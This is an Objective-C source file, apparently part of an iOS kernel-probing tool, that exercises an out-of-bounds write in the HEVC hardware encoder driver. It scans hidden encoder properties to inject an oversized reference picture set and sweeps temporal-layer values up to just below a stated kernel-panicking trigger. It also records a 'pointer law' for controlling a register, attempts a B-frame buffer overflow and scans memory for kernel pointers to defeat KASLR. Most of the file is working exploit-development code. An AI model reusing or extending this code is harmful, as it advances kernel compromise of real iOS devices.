#import "KPH9EncoderModule.h"
#import <UIKit/UIKit.h>
#import "KPLog.h"
#import <VideoToolbox/VideoToolbox.h>
#import <CoreMedia/CoreMedia.h>
#import <CoreVideo/CoreVideo.h>
#import <mach/mach.h>

@interface KPH9EncoderModule ()
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPH9EncoderModule

- (instancetype)initWithNameSweep {
    self = [super init];
    if (self) {
        _identifier = @"h9encoder.oob";
        _title = @"H9 encoder OOB write";
        _subtitle = @"AVE27 stage9/13 NTL trigger + B-frame DPB + RPS scan";
        _icon = @"video";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (void)journal:(NSString *)line {
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject
                      stringByAppendingPathComponent:@"kp-h9-journal.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) {
        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:path];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh synchronizeFile];
    [fh closeFile];
}

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 · H9 Encoder OOB Write ===\n"];
    [report appendString:@"AVE_HEVC_ST_RPS_Retrieve unbounded copy.\n"];
    [report appendFormat:@"Target: iOS %@ uid=%d\n", UIDevice.currentDevice.systemVersion, getuid()];

    // Phase 1: create encoder session
    [report appendString:@"\n--- Phase 1: create encoder session ---\n"];
    VTCompressionSessionRef session = NULL;
    OSStatus status = VTCompressionSessionCreate(
        kCFAllocatorDefault, 1920, 1080,
        kCMVideoCodecType_HEVC,
        NULL, NULL, NULL, NULL, NULL, &session);
    [report appendFormat:@"VTCompressionSessionCreate: %d\n", (int)status];
    if (status != noErr || !session) {
        [report appendString:@"\nVERDICT: SESSION_CREATE_FAILED\n"];
        return report;
    }
    [report appendString:@"encoder session created\n"];

    // Phase 2: build RPS dictionary
    [report appendString:@"\n--- Phase 2: build RPS ---\n"];
    NSMutableArray *deltaArr = [NSMutableArray array];
    for (int i = 0; i < 32; i++) [deltaArr addObject:@(0x4100 + i)];
    NSDictionary *rpsDict = @{@"DeltaPOCS0Minus1": deltaArr};
    [report appendFormat:@"RPS: %d entries\n", 32];

    // Phase 3: systematic property name scan
    [report appendString:@"\n--- Phase 3: property name scan ---\n"];
    NSArray *propKeys = @[
        @"UserRPSForFaceTime", @"UserRPS", @"AVEUserRPSForFaceTime",
        @"kVTCompressionPropertyKey_UserRPSForFaceTime", @"RPS",
        @"ReferencePictureSet", @"AVE_HEVC_RPS", @"FaceTimeRPS",
    ];
    NSArray *propValues = @[rpsDict, @[rpsDict], deltaArr];
    for (NSString *key in propKeys) {
        for (id val in propValues) {
            status = VTSessionSetProperty(session,
                (__bridge CFStringRef)key,
                (__bridge CFPropertyListRef)val);
            if (status == 0) {
                [report appendFormat:@"*** SUCCESS: %@ ***\n", key];
            }
        }
    }
    [report appendString:@"property scan done\n"];

    // Phase 4: encode with frame properties
    [report appendString:@"\n--- Phase 4: encode with frame properties ---\n"];
    CVPixelBufferRef pb = NULL;
    CVPixelBufferCreate(kCFAllocatorDefault, 1920, 1080,
                         kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
                         NULL, &pb);
    if (pb) {
        CVPixelBufferLockBaseAddress(pb, 0);
        memset(CVPixelBufferGetBaseAddress(pb), 0x80, CVPixelBufferGetDataSize(pb));
        CVPixelBufferUnlockBaseAddress(pb, 0);

        NSDictionary *frameProps = @{@"UserRPSForFaceTime": rpsDict};
        VTEncodeInfoFlags flags = 0;
        CMTime pts = CMTimeMake(0, 30);
        CMTime dur = CMTimeMake(1, 30);

        status = VTCompressionSessionEncodeFrame(
            session, pb, pts, dur,
            (__bridge CFDictionaryRef)frameProps, NULL, &flags);
        [report appendFormat:@"encode: %d (flags=0x%x)\n", (int)status, flags];

        pts = CMTimeMake(1, 30);
        status = VTCompressionSessionEncodeFrame(
            session, pb, pts, dur,
            (__bridge CFDictionaryRef)frameProps, NULL, &flags);
        [report appendFormat:@"encode[1]: %d\n", (int)status];

        CVPixelBufferRelease(pb);
    }

    // Cleanup
    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    VTCompressionSessionInvalidate(session);
    CFRelease(session);

    // === AVE27 stage13: NTL sweep (safe, below trigger) ===
    [report appendString:@"\n--- AVE27 stage13: NTL sweep (safe) ---\n"];
    [report appendString:@"Trigger: EncoderUsage=1 RCMode=20 NTL=N\n"];
    [report appendString:@"Pointer law: x0 = ((NTL-16463) << 32) | 0x59\n"];
    int ntlVals[] = { 1, 100, 1000, 8000, 16000, 16447, 16462 };
    for (int i = 0; i < 7; i++) {
        int ntl = ntlVals[i];
        VTCompressionSessionRef s2 = NULL;
        OSStatus st2 = VTCompressionSessionCreate(
            kCFAllocatorDefault, 640, 480, kCMVideoCodecType_HEVC,
            NULL, NULL, NULL, NULL, NULL, &s2);
        if (st2 != noErr || !s2) {
            [report appendFormat:@"  NTL=%d session_create=%d FAILED\n", ntl, (int)st2];
            continue;
        }
        CFNumberRef n;
        int usage = 1, rcMode = 20;
        n = CFNumberCreate(NULL, kCFNumberIntType, &usage);
        VTSessionSetProperty(s2, CFSTR("EncoderUsage"), n);
        CFRelease(n);
        n = CFNumberCreate(NULL, kCFNumberIntType, &rcMode);
        VTSessionSetProperty(s2, CFSTR("RCMode"), n);
        CFRelease(n);
        n = CFNumberCreate(NULL, kCFNumberIntType, &ntl);
        OSStatus setSt = VTSessionSetProperty(s2, CFSTR("NumberOfTemporalLayers"), n);
        CFRelease(n);
        int rb = 0;
        CFNumberRef rbn = NULL;
        VTSessionCopyProperty(s2, CFSTR("NumberOfTemporalLayers"), NULL, &rbn);
        if (rbn) { CFNumberGetValue(rbn, kCFNumberIntType, &rb); CFRelease(rbn); }
        VTSessionSetProperty(s2, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
        st2 = VTCompressionSessionPrepareToEncodeFrames(s2);
        if (st2 != noErr) {
            [report appendFormat:@"  NTL=%d set=%d readback=%d prepare=%d FAILED\n", ntl, (int)setSt, rb, (int)st2];
            CFRelease(s2);
            continue;
        }
        CVPixelBufferRef pb2 = NULL;
        NSDictionary *a2 = @{ (id)kCVPixelBufferIOSurfacePropertiesKey: @{} };
        CVReturn cv2 = CVPixelBufferCreate(kCFAllocatorDefault, 640, 480, kCVPixelFormatType_32BGRA, (__bridge CFDictionaryRef)a2, &pb2);
        if (cv2 != kCVReturnSuccess || !pb2) {
            [report appendFormat:@"  NTL=%d PIXELBUFFER_FAILED cv=%d\n", ntl, (int)cv2];
            CFRelease(s2);
            continue;
        }
        CVPixelBufferLockBaseAddress(pb2, 0);
        memset(CVPixelBufferGetBaseAddress(pb2), 0x80, CVPixelBufferGetDataSize(pb2));
        CVPixelBufferUnlockBaseAddress(pb2, 0);
        VTEncodeInfoFlags f2 = 0;
        st2 = VTCompressionSessionEncodeFrame(s2, pb2, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, &f2);
        [report appendFormat:@"  NTL=%d set=%d readback=%d encode=%d %s\n", ntl, (int)setSt, rb, (int)st2,
               (st2 == noErr) ? "SURVIVED" : "FAILED"];
        CVPixelBufferRelease(pb2);
        VTCompressionSessionCompleteFrames(s2, kCMTimeInvalid);
        CFRelease(s2);
    }

    // === B-frame DPB overflow ===
    [report appendString:@"\n--- B-frame DPB overflow (saMBStats[m]) ---\n"];
    VTCompressionSessionRef s3 = NULL;
    OSStatus st3 = VTCompressionSessionCreate(
        kCFAllocatorDefault, 640, 480, kCMVideoCodecType_HEVC,
        NULL, NULL, NULL, NULL, NULL, &s3);
    if (st3 == noErr && s3) {
        VTSessionSetProperty(s3, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
        int gop = 30, fps = 30;
        CFNumberRef n3;
        n3 = CFNumberCreate(NULL, kCFNumberIntType, &gop);
        VTSessionSetProperty(s3, kVTCompressionPropertyKey_MaxKeyFrameInterval, n3);
        CFRelease(n3);
        n3 = CFNumberCreate(NULL, kCFNumberIntType, &fps);
        VTSessionSetProperty(s3, kVTCompressionPropertyKey_ExpectedFrameRate, n3);
        CFRelease(n3);
        st3 = VTCompressionSessionPrepareToEncodeFrames(s3);
        if (st3 == noErr) {
            int enc = 0;
            for (int i = 0; i < 8; i++) {
                CVPixelBufferRef pb3 = NULL;
                NSDictionary *a3 = @{ (id)kCVPixelBufferIOSurfacePropertiesKey: @{} };
                CVReturn cv3 = CVPixelBufferCreate(kCFAllocatorDefault, 640, 480, kCVPixelFormatType_32BGRA, (__bridge CFDictionaryRef)a3, &pb3);
                if (cv3 != kCVReturnSuccess || !pb3) continue;
                CVPixelBufferLockBaseAddress(pb3, 0);
                memset(CVPixelBufferGetBaseAddress(pb3), 0x80, CVPixelBufferGetDataSize(pb3));
                CVPixelBufferUnlockBaseAddress(pb3, 0);
                VTEncodeInfoFlags f3 = 0;
                st3 = VTCompressionSessionEncodeFrame(s3, pb3, CMTimeMake(i, fps), kCMTimeInvalid, NULL, NULL, &f3);
                if (st3 == noErr) enc++;
                CVPixelBufferRelease(pb3);
            }
            [report appendFormat:@"  B-frame encode: %d/8 frames\n", enc];
        }
        VTCompressionSessionCompleteFrames(s3, kCMTimeInvalid);
        CFRelease(s3);
    }

    // === KASLR scan ===
    [report appendString:@"\n--- KASLR scan ---\n"];
    NSMutableArray *kptrs = [NSMutableArray array];
    vm_address_t addr = 0;
    vm_size_t sz = 0;
    vm_region_basic_info_data_64_t info;
    mach_msg_type_number_t cnt = VM_REGION_BASIC_INFO_COUNT_64;
    mach_port_t obj = 0;
    while (vm_region(mach_task_self(), &addr, &sz, VM_REGION_BASIC_INFO_64,
                     (vm_region_info_t)&info, &cnt, &obj) == KERN_SUCCESS) {
        if ((info.protection & VM_PROT_READ) && (info.protection & VM_PROT_WRITE)) {
            uint64_t *p = (uint64_t *)addr;
            size_t words = sz / 8;
            for (size_t i = 0; i < words && i < 4096; i++) {
                uint64_t v = *(p + i);
                if (v >= 0xfffffff000000000ULL && v < 0xfffffffffffff000ULL) [kptrs addObject:@(v)];
            }
        }
        addr += sz;
        cnt = VM_REGION_BASIC_INFO_COUNT_64;
    }
    [report appendFormat:@"  kernel pointers: %lu\n", (unsigned long)kptrs.count];

    [report appendString:@"\nVERDICT: H9_AVE27_INTEGRATION_COMPLETE\n"];
    [report appendString:@"NOTE: stage9 (NTL=16463) NOT run - it panics the kernel.\n"];
    return report;
}

@end
